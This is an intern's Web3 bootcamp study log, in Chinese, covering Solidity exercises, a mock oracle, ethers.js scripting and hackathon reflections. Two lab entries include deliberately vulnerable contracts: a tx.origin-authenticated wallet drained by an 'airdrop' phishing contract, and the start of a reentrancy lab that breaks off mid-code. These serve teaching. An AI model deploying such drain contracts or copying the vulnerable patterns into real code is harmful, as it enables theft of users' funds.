---
timezone: UTC+8
---

# liji3597

**GitHub ID:** liji3597

**Telegram:** 

## Self-introduction

Web3 实习计划 2025 冬季实习生

## Notes

<!-- Content_START -->
# 2026-02-06
<!-- DAILY_CHECKIN_2026-02-06_START -->
1.  继承和引用
    
    ![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-02-06-1770381082550-image.png)
    
    ### 深度分析：`try/catch` 的三个核心规则
    
    为了真正理解这段代码的价值，你需要知道它背后的机制：
    
    规则一：仅限外部调用 (External Calls Only)
    
    `try/catch` **只能**用于外部合约调用（External Call）或者创建新合约（`new Contract()`）。
    
    -   **有效**: `try externalContract.function()`
        
    -   **无效**: `try internalFunction()` (不能捕获同一个合约内的普通函数错误)
        
    -   **无效**: `try this.externalFunction()` (虽然是通过 `this` 变成了外部调用，但通常不建议这么用 try/catch)
        
    
    规则二：保护调用者 (Sandbox Effect)
    
    如果 `externalContract.getTwo()` 失败了：
    
    1.  **被调用者回滚**: `CalledContract` 中发生的任何状态改变都会被撤销。
        
    2.  **调用者继续**: `TryCatcher` **不会回滚**。它会进入 `catch` 块，你可以在这里做补救措施（比如把结果设为 0，或者发出一个错误日志）。
        
    
    规则三：解码也算在尝试范围内
    
    `try` 模块不仅检查函数是否 revert，还会检查返回值是否匹配。
    
    -   如果 `getTwo()` 实际上返回了一个 `string` 而不是 `uint256`，Solidity 无法解码，这也会被视为“失败”，从而跳进 `catch` 块。
<!-- DAILY_CHECKIN_2026-02-06_END -->

# 2026-02-05
<!-- DAILY_CHECKIN_2026-02-05_START -->

关于黑客松的总结和反思

开源地址：[https://github.com/liji3597/nancy-alpha](https://github.com/liji3597/nancy-alpha)

\## 1. 项目确定：

周四晚上确定议题，周五并没有做，周六开始做后端，周日和前端的协同不到位，导致最终demo的展示情况不尽如意。

OGBC × ScalingX - 预测市场 (Prediction Market Track)

🎯 核心目标： 基于 Polymarket 在 Polygon 链上的真实交易与市场数据，构建具有实际价值的数据分析工具、交易辅助系统或创新型应用，提升预测市场生态的可用性与透明度。 重点考察参赛者对链上数据解码、索引、存储与应用能力的综合运用。

💡 开发灵感

数据分析与可视化：开发市场情绪仪表盘、价格趋势与深度分析或构建大额交易监测工具。

交易与风控工具：构建智能下单系统、持仓 PnL 模拟或市场结算与争议追踪工具。

创新型应用：打造链上行为交易者画像系统、预测市场社交声誉体系或进行 Polymarket 数据 API 聚合服务。

🛠 技术要求

参赛项目需基于链上真实数据完成解码与验证，并提供可运行的系统与完整文档。

参考官方提供的合约交互文档或逻辑架构图。

设计合理的激励机制（如何防止作恶，如何激励正确预测）。

📝更多信息

学习资料：[https://github.com/ogalias/OGBC-Intern-Project](https://github.com/ogalias/OGBC-Intern-Project)

##反思：

队友都很好，思维很活跃也很有想法。吃了全栈项目做的少的亏，至少要有一定的经验积累才知道时间的前期规划；

\## 2. 技术架构

\`\`\`

┌─────────────────────────────────────────────────────────────────┐

│ Nancy's Alpha │

├─────────────────────────────────────────────────────────────────┤

│ │

│ ┌──────────────────────┐ ┌──────────────────────────────┐ │

│ │ Frontend │ │ Backend │ │

│ │ (Next.js 14) │────▶│ (FastAPI + Python) │ │

│ │ │ │ │ │

│ │ • Dashboard │ │ • REST API │ │

│ │ • Markets View │ │ • AI Analyzer (DeepSeek API) │ │

│ │ • Traders Profile │ │ • Chain Listener │ │

│ │ • Whale Alerts │ │ • Insider Detection │ │

│ └──────────────────────┘ └──────────────────────────────┘ │

│ │ │ │

│ ▼ ▼ │

│ ┌──────────────────────┐ ┌──────────────────────────────┐ │

│ │ Vercel (前端) │ │ Railway/Render (后端) │ │

│ │ + Edge Functions │ │ + PostgreSQL │ │

│ └──────────────────────┘ └──────────────────────────────┘ │

│ │ │

│ ▼ │

│ ┌──────────────────────────────┐ │

│ │ External Services │ │

│ │ • Polygon RPC (链上数据) │ │

│ │ • Gamma API (市场元数据) │ │

│ │ • DeepSeek API (AI分析) │ │

│ └──────────────────────────────┘ │

└─────────────────────────────────────────────────────────────────┘

\`\`\`

反思：

1\. 后端架构基本没有什么问题，但是数据库的更新存入存在一些问题

2\. 需要前端+后端端口全部打开，进行测试

3\. AI对于链上数据的分析比较生疏，尤其是对于数据分类，需要自己去深入理解API然后手动修改

4\. 也许是样本不够多的原因，在数据库存储入库和请求RPC数量的限制这一块很容易出错

5\. 项目需求文档是必须要好好考虑的问题，但目前仍处在学习需求驱动的阶段，积攒一定项目经验之后可以进行顶层设计

6\. 忽视了前后端联合调试所需要的时间

\## 3. 前端和Demo

不是目前的主要学习目标，仅作记录，待日后分析

方案一：梗图讽刺风 (Meme / Satire)

核心逻辑：既然是预测政治和大事，不如直接致敬“最强内幕交易员”或者“键政圈”。把严肃的数据分析包装成一种“我在抄作业”的荒诞感。

英文名：Nancy's Alpha (致敬“国会山股神”南希·佩洛西) / [CopyTrade.gov](http://CopyTrade.gov) / Trust Me Bro

中文名：南希严选 / 国会山望远镜 / 懂王雷达

UI/UX 噱头点子：

Loading 动画：不是转圈，而是一个碎纸机正在粉碎“机密文件”，或者一直显示“Connecting to CIA server...”

巨鲸标记：把追踪到的巨鲸（Whales）头像不显示普通的 Wallet Icon，而是换成 佩洛西头像、特朗普发型、或者带墨镜的 Pepe 青蛙。

按钮文案：把 "Analyze"（分析）改成 "Leak Alpha"（泄露天机）；把 "Follow"（关注）改成 "Copy Homework"（抄作业）。

警报音效：发现大单时，播放一声经典的 "Wrong!" (Trump声音) 或者收银机的 "Ka-ching!"。
<!-- DAILY_CHECKIN_2026-02-05_END -->

# 2026-02-03
<!-- DAILY_CHECKIN_2026-02-03_START -->


1.  依旧是Solidity的学习，遇到一个问题记录一下：写关于结构体的时候发现结构体命名无法嵌套自身结构体，但是可以嵌套结构体的映射。简单来说就是结构体在初始声明的时候就必须要确定自身的大小是确定的，是不可以改变的，但若是嵌套自身，就成了无限递归，这在Solidity中是不可行的；然而使用映射，person可以作为value值来使用，因为这相当于已经在存储中确定好了大小，本身可视为指针而不是结构体的递归，所以可行。
    
2.  依旧是openclaw，参考一些推特用户的经验，让我的claw学会了自我探索+自我进化+定时提醒，但是发现对agent的理解还是不到位，希望自己加深理解，能够开发出更大的潜力，找到固定应用场景的时候我想我会买一台Mac Mini或者Mac Studio来为生产力工具出一份力。
    

![屏幕截图 2026-02-03 160447.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-02-03-1770126005477-_____2026-02-03_160447.png)
<!-- DAILY_CHECKIN_2026-02-03_END -->

# 2026-02-02
<!-- DAILY_CHECKIN_2026-02-02_START -->



1.  继续学solidity，感觉AI写的代码虽然好用，但是像无情的杀戮机器一样，见血封喉；不像过去看到了各种代码，纵横密布，没有那种以正合，以奇胜的神之一手了，很遗憾。但是不懂代码的有时候又会找不到bug所在，在我看来CC这类AI编程助手相当于是能力的放大器，而本身扎实的理论基础和必不可缺的实战经验是地基，AI对人的增幅绝对是db级别的指数增长；
    
2.  我甚至有喂给它我的代码的冲动，虽然大概率会被CC纠正，但其中强烈的个人风格和蛛丝马迹中看到人的性格特点可以帮我更好的完成自我的反省
    
3.  openclaw真好玩
    
4.  来财老师教的很好，就是习惯了用cluade code很难接受其他的CLI了
    
    bty 谷歌在维护用户市场和用户共识方面真的很肯下血本，antigravity已经用爽了，已经忍不住要给Gemini ultra 付费了，从白嫖到忠实的付费用户还是甘之如饴，万恶的资本主义
<!-- DAILY_CHECKIN_2026-02-02_END -->

# 2026-02-01
<!-- DAILY_CHECKIN_2026-02-01_START -->




1.  参加黑客松，听取他人讲述
    
2.  修改后端API的兼容问题
    
    ![本地数据库数据.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-02-01-1769960436364-_______.png)

![Alpha.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-02-01-1769960356648-Alpha.png)
<!-- DAILY_CHECKIN_2026-02-01_END -->

# 2026-01-31
<!-- DAILY_CHECKIN_2026-01-31_START -->





1.  前端+后端联调
    
    ![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-31-1769867909823-image.png)![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-31-1769867899993-image.png)
<!-- DAILY_CHECKIN_2026-01-31_END -->

# 2026-01-30
<!-- DAILY_CHECKIN_2026-01-30_START -->






1.  讨论黑客松后端接口元数据问题
    
    1.  市场接口数据
        
    2.  交易员接口元数据
        
    3.  市场内RPC
        
2.  开会讨论
    
    ![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-30-1769788445062-image.png)
3.  cobuilding学习
<!-- DAILY_CHECKIN_2026-01-30_END -->

# 2026-01-29
<!-- DAILY_CHECKIN_2026-01-29_START -->







1.  cobuilding 认真学习和复盘了需求文档和vibe coding技巧
    

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-29-1769701042472-image.png)

2.  认真讨论黑客松议题，找到需求文档  
    
    ![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-29-1769701074588-image.png)
<!-- DAILY_CHECKIN_2026-01-29_END -->

# 2026-01-28
<!-- DAILY_CHECKIN_2026-01-28_START -->








1.  优化函数
    

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AccessControlOptimized {
    
    address public owner;
    // 建议把变量名改成 isAdmin，语义更清晰（这是一个判断句：是管理员吗？）
    mapping(address => bool) public isAdmin;

    // --- 优化 1: 定义自定义错误 (省 Gas，替代长字符串) ---
    error NotAuthorized(address caller);
    error OnlyOwnerAllowed();

    constructor() {
        owner = msg.sender;
    }

    // --- 优化 2: 使用 Modifier (修饰符) ---
    // 这是 Solidity 的核心特性，把权限检查提取出来
    modifier onlyAuthorized() {
        // 逻辑：要么是 owner，要么在 isAdmin 表里是 true
        if (msg.sender != owner && !isAdmin[msg.sender]) {
            revert NotAuthorized(msg.sender);
        }
        _; // 继续执行后续代码
    }

    // --- 修复后的 TODO 1: 纯查询函数 ---
    // 这个函数只返回 true/false，绝不报错 (revert)
    // 前端网页可以用这个来决定要不要显示"管理按钮"
    function isAuthorized(address _user) public view returns (bool) {
        return (_user == owner || isAdmin[_user]);
    }

    // --- 修复后的 TODO 2: 授权管理员 ---
    function grantAdmin(address _user) public {
        // 逻辑修正：检查 "我(msg.sender)" 是不是 owner
        if (msg.sender != owner) {
            revert OnlyOwnerAllowed();
        }
        
        isAdmin[_user] = true;
    }

    // --- 修复后的 TODO 3: 受限操作 ---
    // 直接挂上 onlyAuthorized 修饰符，代码极其简洁
    function restrictedAction() public view onlyAuthorized {
        // 这里不需要再写 require 了，modifier 已经帮你挡住了坏人
        
        // 业务逻辑...
    }
}
```

2.  加入黑客松并讨论项目议题  
      
    
    ![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-28-1769614491350-image.png)
<!-- DAILY_CHECKIN_2026-01-28_END -->

# 2026-01-27
<!-- DAILY_CHECKIN_2026-01-27_START -->









# 第 16 天：预言机 (Oracles) —— 打破区块链的“断网”诅咒

作为嵌入式工程师，你知道 MCU 如果没有传感器（ADC/GPIO）就是个瞎子。

同样的，区块链虽然算力强大，但它有一个致命缺陷：**它是“断网”的**。

**智能合约无法发起 HTTP 请求。** 你不能在 Solidity 里写 `http.get("weather.com")`。

-   **为什么？** 因为区块链要求 **确定性 (Determinism)**。如果全球 10,000 个节点运行你的代码，有的节点网速快拿到了 25度，有的节点断网了拿到 0度，共识就会崩溃。
    

所以，我们需要 **预言机 (Oracle)**。

## 1\. 理论映射：ADC 与 外部世界

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-27-1769514809505-image.png)

**架构模式：请求 - 响应 (Request-Response)**

这就像 **DMA 中断模式**：

1.  **CPU (合约):** 发起请求 “我要读取温度” -> 写入寄存器。
    
2.  **ADC (Oracle):** 感知到请求 -> 开始转换（去链下查数据）。
    
3.  **ISR (回调):** 转换完成 -> 触发中断，把数据填回内存。
    

* * *

## 2\. 实战：构建一个“模拟预言机”系统

因为接入真实的 Chainlink 需要测试币（Link Token）和复杂的配置，我们今天**手写一个简易版 Oracle** 来彻底理解它的原理。

我们将构建两个合约：

1.  `MockOracle` **(服务端):** 模拟 Chainlink，负责接收请求和回填数据。
    
2.  `SmartGreenhouse` **(客户端):** 你的业务合约，想根据天气自动控制洒水器。
    

请在 Remix 中新建 `Day16_Oracle.sol`：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. 模拟预言机 (ADC) ---
contract MockOracle {
    // 定义一个请求ID计数器
    uint256 private requestId = 0;
    
    // 记录谁发起了请求 (Mapping: RequestID => ClientAddress)
    mapping(uint256 => address) public pendingRequests;

    // 事件：通知链下节点 "有人要数据！"
    event RequestData(uint256 id, string url);

    // 1. 接收请求 (CPU 发指令给 ADC)
    function requestWeather(string memory _url) external returns (uint256) {
        requestId++;
        pendingRequests[requestId] = msg.sender;
        
        // 发射事件，链下的 Python/JS 脚本会监听到这个事件
        emit RequestData(requestId, _url);
        return requestId;
    }

    // 2. 回填数据 (ADC 转换完成，触发中断)
    // 在真实场景中，这个函数只有 Chainlink 节点能调用
    function fulfill(uint256 _id, uint256 _temperature) external {
        address client = pendingRequests[_id];
        require(client != address(0), "Request not found");

        // 回调客户端的 fulfillWeather 函数
        // 这里用了接口调用的方式
        IGreenhouse(client).fulfillWeather(_id, _temperature);
        
        // 清除请求
        delete pendingRequests[_id];
    }
}

// 定义客户端接口 (为了让 Oracle 能回调)
interface IGreenhouse {
    function fulfillWeather(uint256 _requestId, uint256 _temp) external;
}

// --- 2. 智能温室 (用户应用) ---
contract SmartGreenhouse is IGreenhouse {
    MockOracle public oracle;
    
    uint256 public temperature; // 当前温度
    bool public sprinklerOn;    // 洒水器状态
    
    // 只有 Oracle 能回调我 (安全检查)
    modifier onlyOracle() {
        require(msg.sender == address(oracle), "Only Oracle can call this");
        _;
    }

    constructor(address _oracleAddress) {
        oracle = MockOracle(_oracleAddress);
    }

    // A. 发起请求
    function updateWeather() public {
        // 调用 Oracle 合约
        oracle.requestWeather("api.weather.com/shanghai");
    }

    // B. 接收回调 (相当于 ISR 中断服务函数)
    function fulfillWeather(uint256, uint256 _temp) external override onlyOracle {
        temperature = _temp;
        
        // 自动化逻辑: 如果超过 30度，打开洒水器
        if (_temp > 30) {
            sprinklerOn = true;
        } else {
            sprinklerOn = false;
        }
    }
}
```

* * *

## 3\. 实验步骤 (扮演三个角色)

**角色 A: 部署者**

1.  部署 `MockOracle`。**复制它的地址**。
    
2.  部署 `SmartGreenhouse`，构造函数填入 `MockOracle` 的地址。
    

**角色 B: 触发器 (模拟定时任务)**

1.  在 `SmartGreenhouse` 中点击 `updateWeather`。
    
2.  _观察日志：_ 此时 `temperature` 还是 0。因为这只是发起了请求，数据还没回来。
    
3.  **去** `MockOracle` **查看日志 (Logs)：** 应该能看到 `RequestData` 事件，包含 `id=1`。
    

**角色 C: 预言机节点 (模拟链下脚本)**

_现在你要手动扮演 Chainlink 节点，把数据填回去。_

1.  回到 `MockOracle` 合约。
    
2.  找到 `fulfill` 函数。
    
3.  输入参数：
    
    -   `_id`: `1` (刚才生成的请求ID)。
        
    -   `_temperature`: `35` (模拟 35度高温)。
        
4.  点击 transact。
    

**角色 D: 验证结果**

1.  回到 `SmartGreenhouse`。
    
2.  点击 `temperature` -> 应该是 `35`。
    
3.  点击 `sprinklerOn` -> 应该是 `true` (因为 35 > 30)。
    

* * *

### 深度思考

做完这个实验，你就理解了 **DeFi (去中心化金融)** 是怎么运行的。

Uniswap 的价格、Aave 的清算逻辑，全都是通过这种 **Request (Event) -> Off-chain Fetch -> Callback** 的模式获取外部价格的。

**今日任务：**

完成上述“手动预言机”流程。

1.  先发起请求，截图证明 `temperature` 是 0。
    
2.  手动 `fulfill` 填入 `35`。
    
3.  截图证明 `SmartGreenhouse` 的 `sprinklerOn` 自动变为了 `true`。
    

这就是区块链连接现实世界的唯一桥梁！
<!-- DAILY_CHECKIN_2026-01-27_END -->

# 2026-01-26
<!-- DAILY_CHECKIN_2026-01-26_START -->










# **第 15 天：Web3.js / Ethers.js —— 区块链的“驱动库”**

## 1\. 理论映射：如何与“云端单片机”对话？

现在你的 `LogisticsSystem` 合约已经部署在区块链（云端单片机）上了。之前我们都是点 Remix 的按钮来交互，这相当于用 **J-Link 调试器** 手动改寄存器。

现在我们要写代码来自动化交互。

![image.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-26-1769440312249-image.png)

**核心公式：**

> **交互对象 = 合约地址 (Address) + 接口定义 (ABI) + 钱包私钥 (Signer)**

* * *

## 2\. 关键概念：ABI (应用二进制接口)

这是连接“固件”和“软件”的桥梁。

在 Remix 中，当你编译 `LogisticsSystem` 时，编译器生成了一个 JSON 数组，描述了所有函数。

**长这个样子（简化版）：**

JSON

```
[
    {
        "type": "function",
        "name": "createOrder",
        "inputs": [{"type": "uint256"}, {"type": "string"}]
    },
    {
        "type": "event",
        "name": "StatusUpdated",
        ...
    }
]
```

这就是 JS 脚本知道“如何组包”的说明书。

* * *

## 3\. 实战操作：编写你的第一个“上位机脚本”

我们不需要安装复杂的 Node.js 环境，Remix 自带了一个脚本运行器。

步骤 1：获取“设备”信息

1.  确保你的 `LogisticsSystem` 还在部署状态（如果之前的关了，请重新部署一个）。
    
2.  **复制合约地址**：例如 `0xD7...`。
    
3.  **复制 ABI**：
    
    -   点击 Remix 左侧第 3 个图标（编译器的图标）。
        
    -   在最下方找到 **ABI** 按钮（通常是一个小小的复制图标，或者写着 “ABI”）。
        
    -   _点击复制，找个记事本暂存一下，一会要用。_
        

**步骤 2：编写脚本**

1.  在 Remix **File Explorer** (文件浏览器) 中。
    
2.  打开 `scripts` 文件夹（如果没有，右键新建一个）。
    
3.  新建文件 `Day15_Interact.js` (注意后缀是 `.js`)。
    
4.  输入以下代码：
    

JavaScript

```
// Remix 自动注入了 ethers 库，就像自动 include 了头文件
// 这是一个异步函数 (Async/Await)
(async function () {
    try {
        // --- 1. 配置参数 (请填入您的真实信息) ---
        const contractAddress = "0x..."; // <--- TODO: 粘贴刚才复制的合约地址
        const contractName = "LogisticsSystem"; // 合约名字

        console.log(`Connecting to contract: ${contractName} at ${contractAddress}`);

        // --- 2. 获取合约对象 (上位机初始化) ---
        // 在 Remix 脚本里，artifacts 帮我们自动管理了 ABI，不用手动粘贴一大坨 JSON
        // 这相当于: Handle_t hDevice = InitDevice(Address);
        const metadata = JSON.parse(await remix.call('fileManager', 'getFile', `artifacts/${contractName}.json`));
        const signer = (await ethers.getSigners())[0]; // 获取当前账号 (Admin)
        
        // 实例化合约
        const contract = new ethers.Contract(contractAddress, metadata.abi, signer);

        // --- 3. 读数据 (Read) ---
        // 调用 mapping: orders(101)
        console.log("Reading Order 101 info...");
        const orderId = 101;
        const orderInfo = await contract.orders(orderId);
        
        // 打印结果 (注意: 嵌入式里的枚举 enum 返回的是整数)
        console.log(`[Result] Item: ${orderInfo.item}`);
        console.log(`[Result] State: ${orderInfo.state} (0=Pending, 1=Shipped, 2=Delivered)`);
        console.log(`[Result] Location: ${orderInfo.location}`);

        // --- 4. 写数据 (Write) ---
        // 只有当您是 Admin 且想做操作时才解开下面注释
        // console.log("Updating status...");
        // const tx = await contract.shipOrder(101, "Hong Kong Port");
        // await tx.wait(); // 等待区块确认
        // console.log("Transaction confirmed!");

    } catch (e) {
        console.log(e.message);
    }
})();
```

**步骤 3：运行脚本**

1.  打开 `Day15_Interact.js` 文件。
    
2.  **关键设置：** 记得把第 6 行的 `contractAddress` 换成你刚才部署的真实地址！
    
3.  点击文件编辑区左上角的绿色三角形 **Play** 按钮。
    
    -   或者按 `Ctrl + Shift + S`。
        
4.  **观察控制台：**
    
    -   你应该能看到类似串口打印的信息：
        
    -   `[Result] Item: STM32 Board`
        
    -   `[Result] State: 1`
        
    -   `[Result] Location: Shenzhen Warehouse`
        

* * *

![屏幕截图 2026-01-26 230142.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/liji3597/images/2026-01-26-1769440565560-_____2026-01-26_230142.png)

### 深度思考

这个脚本虽然简单，但它揭示了 DApp (去中心化应用) 的本质：

**前端网页 (React/Vue) + Ethers.js + 智能合约 = DApp**

这就像：

**上位机界面 (Qt) + 串口驱动库 + MCU 固件 = 物联网系统**

### **今日作业：**

1.  运行脚本，成功读取出你昨天实验中的订单信息。
    
2.  **挑战：** 尝试在脚本里调用写函数。
    
    -   比如，先在 Remix 按钮上手动创建一个新订单 `102`。
        
    -   然后修改脚本，读取 `102` 的信息。
        
    -   _进阶挑战：_ 能否在脚本里直接调用 `createOrder`？(这需要你查阅 ethers.js 文档关于 `contract.functions` 的用法，或者参考代码注释里的写法)。
<!-- DAILY_CHECKIN_2026-01-26_END -->

# 2026-01-25
<!-- DAILY_CHECKIN_2026-01-25_START -->












第一阶段：1月19日 - 1月20日

**【主题：方向探索与顶层设计】**

-   **原定计划：** 沉下心学习 Solidity 基础语法、Web3 实习手册、中文排版规范。
    
-   **实际执行：** 将精力集中在了**社区构建的战略思考**上。并没有局限于"写代码"，而是思考如何建立一个关于"代码审计"、"Rust" 和 "Solana" 的技术社区。这个阶段更像是一个**产品经理**，在规划未来的技术路线图和资源整合方向。
    
-   **关键成果：** 确立了"技术深度"（审计/底层语言）作为社区核心竞争力，跳出了泛泛的学习模式。
    

* * *

第二阶段：1月21日 - 1月22日

**【主题：深水区实战与服务器运维】**

-   **原定计划：** 深入学习工具链，配置 Hardhat 环境，学习 Ethers.js 脚本交互。
    
-   **实际执行：** **偏离计划最远**但也最"硬核"\*\*的两天。没有在本地配置测试环境，而是直接冲进了云端部署。为了运行 **NOFX 交易机器人**，你从零开始摸索 **Railway** 和 **VPS** 的配置。实际上是在通过解决报错来学习环境配置，而非通过教程。
    
-   **技术债：** 因为忙于部署，**Hardhat 测试框架**和**Ethers.js 的代码编写**被搁置。这是成为合约开发者的必修课，目前处于"缺课"状态。
    

* * *

第三阶段：1月23日 - 1月24日

**【主题：工具部署与回归主线】**

-   **原定计划：** Remix 实践、Ethernaut 挑战、周会分享。
    
-   **实际执行：** 实战惯性依然很强。继续在阿里云 (Alibaba Cloud) 上部署 **Antigravity-Manager** 工具，进一步巩固了 **Docker** 和 **Linux 命令行** 的技能。值得肯定的是，在折腾工具的同时，开始**回归 Solidity 学习**，询问了具体的课程进度和代码问题，试图将运维经验与代码逻辑结合。
    
-   **关键成果：** 成功跑通了多个复杂的 Web3 工具，验证了动手能力；同时意识到基础语法的重要性，开始回填知识。
<!-- DAILY_CHECKIN_2026-01-25_END -->

# 2026-01-24
<!-- DAILY_CHECKIN_2026-01-24_START -->













# 第13天：身份伪造 (`tx.origin`) 与 角色管理

## 1\. 理论映射：谁才是真正的调用者？

在 Solidity 中，有两个变量用来识别“谁调用了我”，初学者极易混淆：

| 变量 | 含义 | 嵌入式类比 | 安全性 |
| msg.sender | 直接调用者 (上一跳) | MAC 地址 / 上一跳路由。谁直接发包给我，就是谁。 | 安全 (推荐) |
| tx.origin | 交易发起者 (源头) | 源 IP 地址。谁最开始发起了这笔操作，不管中间经过了多少路由器。 | 危险 (慎用) |

**攻击原理：**

如果你用 `tx.origin` 做鉴权（判断 `tx.origin == admin`），黑客可以诱导你调用他的恶意合约。

1.  **你 (Admin)** 调用 **恶意合约 (Malicious)**。
    
2.  **恶意合约** 转头调用 **你的钱包 (Wallet)**。
    
3.  在 **Wallet** 看来：
    
    -   `msg.sender` 是 **恶意合约**。
        
    -   `tx.origin` 依然是 **你 (Admin)**！
        
    -   **结果：** 鉴权通过，钱被转走。
        

* * *

## 2\. 实战演练：构建“可被钓鱼”的钱包

我们要写两个合约：一个用 `tx.origin` 鉴权的傻钱包，一个伪装成“免费领奖”的攻击合约。

**请在 Remix 中新建** `Day13_Phishing.sol`**：**

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. 受害者钱包 (Phishable Wallet) ---
contract Phishable {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    // [漏洞]：使用 tx.origin 判断权限
    // 只要源头是 owner，就允许转账。忽略了中间人可能是黑客。
    function withdrawAll(address _recipient) public {
        require(tx.origin == owner, "Hacker detected? No, you look like owner.");
        payable(_recipient).transfer(address(this).balance);
    }
}

// --- 2. 攻击者合约 (Malicious Contract) ---
contract Attack {
    Phishable public victim;
    address payable public hacker;

    constructor(Phishable _victim) {
        victim = _victim;
        hacker = payable(msg.sender);
    }

    // 诱饵函数：伪装成“领取空投”或“看似无害的逻辑”
    function claimAirdrop() public {
        // 当 owner 调用这个函数时：
        // 1. tx.origin 是 owner
        // 2. msg.sender 是 owner
        
        // 攻击开始：攻击合约代替 owner 去调用受害者钱包
        // 在 victim.withdrawAll 内部：
        //    tx.origin 依然是 owner (检查通过！)
        //    msg.sender 是 Attack 合约 (被忽略)
        victim.withdrawAll(hacker);
    }
}
```

* * *

## 3\. 攻击步骤 (钓鱼模拟)

**步骤 1：部署受害者**

1.  使用 **账号 A** (扮演管理员)。
    
2.  部署 `Phishable`，并存入 **5 ETH** (在 Deploy 时 Value 填 5)。
    

**步骤 2：部署攻击者**

1.  切换到 **账号 B** (扮演黑客)。
    
2.  填入 `Phishable` 的地址，部署 `Attack`。
    

**步骤 3：受害者上钩 (关键一步)**

_这是社会工程学攻击。假设黑客发给管理员一个链接：“点击领取 1000 USDT 空投！”_

1.  **切回 账号 A** (管理员)。
    
2.  调用 `Attack` 合约的 `claimAirdrop` 函数。
    
    -   _管理员心想：我只是调一下这个空投合约，又没把私钥给他，能出什么事？_
        
3.  **结果：** 交易成功。
    

**步骤 4：查看战果**

1.  查看 `Phishable` 余额 -> **0**。
    
2.  查看 黑客 (账号 B) 余额 -> **增加了 5 ETH**。
    

* * *

4\. 进阶防御：基于角色的权限控制 (RBAC)

既然 `onlyOwner` 只能管一个人，如果我有“发货员”、“财务”、“管理员”三种角色怎么办？

嵌入式里我们用 **位掩码 (Bitmask)**，Web3 里我们用 **OpenZeppelin AccessControl**。

请新建 `Day13_AccessControl.sol`：

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";

contract SupplyChain is AccessControl {
    // 1. 定义角色 (本质上是 bytes32 哈希值)
    // ADMIN_ROLE 是默认管理员角色
    bytes32 public constant LOGISTICS_ROLE = keccak256("LOGISTICS");
    bytes32 public constant FINANCE_ROLE = keccak256("FINANCE");

    constructor() {
        // 2. 给部署者赋予最高管理员权限
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    // 3. 只有“物流员”能调用的函数
    function shipProduct() public onlyRole(LOGISTICS_ROLE) {
        // 发货逻辑...
    }

    // 4. 只有“财务”能调用的函数
    function approvePayment() public onlyRole(FINANCE_ROLE) {
        // 付款逻辑...
    }

    // 5. 管理员可以添加新人
    function hireLogistics(address _newWorker) public onlyRole(DEFAULT_ADMIN_ROLE) {
        grantRole(LOGISTICS_ROLE, _newWorker);
    }
}
```

* * *

### 今日任务

1.  **完成钓鱼攻击：** 截图证明明明只是点了一个不相关的合约，结果自己的钱包却被掏空了。
    
2.  **体验 RBAC：**
    
    -   部署 `SupplyChain`。
        
    -   尝试用管理员账号调用 `shipProduct` -> **预期报错** (因为管理员默认只有 Admin 权限，没有物流权限)。
        
    -   给自己 `grantRole(LOGISTICS_ROLE, 你的地址)`。
        
    -   再次调用 `shipProduct` -> **预期成功**。
<!-- DAILY_CHECKIN_2026-01-24_END -->

# 2026-01-23
<!-- DAILY_CHECKIN_2026-01-23_START -->
















# 第12天：重入攻击 (Reentrancy) —— 致命的递归中断

1\. 理论映射：中断嵌套与临界区失效

在 RTOS 或裸机开发中，你一定遇到过这种噩梦场景：

1.  **主线任务**正在修改一个全局变量 `Global_Counter`（比如减 1）。
    
2.  **突然中断来了**（ISR）。
    
3.  **ISR** 里竟然也去操作这个 `Global_Counter`。
    
4.  **结果：** 主线任务恢复时，覆盖了 ISR 的修改，或者 ISR 基于错误的值做了判断。
    

**在区块链中，情况更糟：**

-   **场景：** 银行合约正在给用户退款（转账 ETH）。
    
-   **触发：** 转账动作（`call`）会自动触发收款方合约的 `receive()` 函数（相当于触发了外部中断）。
    
-   **攻击：** 黑客在 `receive()` 函数里，**再次调用** 银行的退款函数。
    
-   **漏洞：** 此时银行的“余额扣除”代码还没执行完！银行以为黑客还有钱，于是再次转账... 如此循环，直到银行被掏空。
    

这就是 **“重入”**：在函数执行结束前，重新进入了该函数。

* * *

2\. 实战演练：掏空 ATM 机

我们要写两个合约：一个“傻白甜”银行（受害者），一个“强盗”合约（攻击者）。

**请在 Remix 中新建** `Day12_Reentrancy.sol`**：**

Solidity

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// --- 1. 受害者合约 (Vulnerable Bank) ---
contract EtherStore {
    mapping(address => uint256) public balances;

    // 存款功能
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // 取款功能 (有漏洞！)
    function withdraw() public {
